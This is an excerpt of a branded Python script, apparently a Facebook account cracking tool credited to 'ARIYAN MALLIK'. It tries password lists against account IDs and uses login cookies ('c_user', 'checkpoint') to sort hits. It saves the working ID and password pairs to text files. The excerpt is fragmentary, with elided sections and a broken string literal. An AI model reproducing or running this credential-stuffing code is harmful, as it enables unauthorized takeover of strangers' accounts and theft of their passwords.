...
try:
	prox= requests.get('https://github.com/ariyan94/RANDOM/blob/main/Ariyan.txt).text
...
logo=("""\033[1;97m
     ...
     \x1b[1;91m    /  \  | |__) | | |  \ \_/ //  \  |  \| |
     \x1b[1;91m  / /\ \ |  _  /  | |   \   // /\ \ | . ` |     
   \x1b[1;97m  / ____ \| | \ \ _| |_   | |/ ____ \| |\  |
                       /_/    \_\_|  \_\_____|  |_/_/    \_\_| \_|
\33[1;37m----------------------------------------------
→   Owner      :  ARIYAN   MALLIK 
→   Facebook   :  ARIYAN MALLIK
→   Github     :  ariyan94
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/profile.php?id=100084159245405');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mARIYAN\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[ARIYAN-OK] '+ids+' | '+pas+'\033[1;32m')
				...
				if 'y' in pcp:
					...
					print('\33[1;31m[ARIYAN-CP] '+ids+' | '+pas+'\33[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[ARIYAN-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/ARIYAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def chos():
    ...
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {ariyan+1} : ")
        HamiiID.append(pww)
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[ARIYAN-OK] '+cid+' | '+ps+'\033[1;32m')
				open('ARIYAN-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[ARIYAN-CP] '+cid+' | '+ps+'\33[0;97m')
				open('ARIYAN-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
